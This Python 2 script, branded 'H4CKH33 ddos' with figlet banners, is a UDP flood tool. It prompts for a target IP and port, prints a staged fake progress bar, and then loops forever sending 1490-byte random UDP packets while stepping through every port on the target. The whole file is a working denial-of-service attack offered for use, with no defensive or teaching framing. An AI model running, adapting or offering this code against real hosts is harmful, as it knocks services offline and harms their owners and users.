import os,sys

os.system ("figlet -f mono12 Hello | lolcat -a ")
import sys
import os
import time
import socket
import random
#Code Time
from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

##############
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)
#############

os.system("clear")
os.system("figlet -f mono12 H4CKH33 ddos | lolcat -a ")
print ("  ")
ip = raw_input("\033[34mIP Target --->\033[32m ")
print ("  ")
port = input("\033[34mPort      --->\033[32m ")

os.system("clear")
os.system("figlet SHOOT ! ! | lolcat")
print "[                     ] 0% "
time.sleep(3)
print "[=====>               ] 25%"
time.sleep(3)
print "[==========>          ] 50%"
time.sleep(3)
print "[===============>     ] 75%"
time.sleep(3)
print "[====================>] 100%"
time.sleep(3)
sent = 0
while True:
     sock.sendto(bytes, (ip,port))
     sent = sent + 1
     port = port + 1
     print "Sent %s packet to %s throught port:%s"%(sent,ip,port)
     if port == 65534:
       port = 1
